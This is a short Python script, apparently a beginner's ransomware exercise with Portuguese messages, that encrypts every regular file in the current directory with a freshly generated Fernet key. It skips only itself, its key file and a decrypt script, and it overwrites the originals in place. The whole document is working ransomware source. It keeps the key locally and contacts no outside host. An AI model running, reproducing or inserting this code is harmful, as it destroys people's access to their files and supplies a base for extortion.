import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransonware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print("Arquivos Criptografados: ", files)

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_encrypt = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypt)

print("Todos os arquivos foram criptografados!")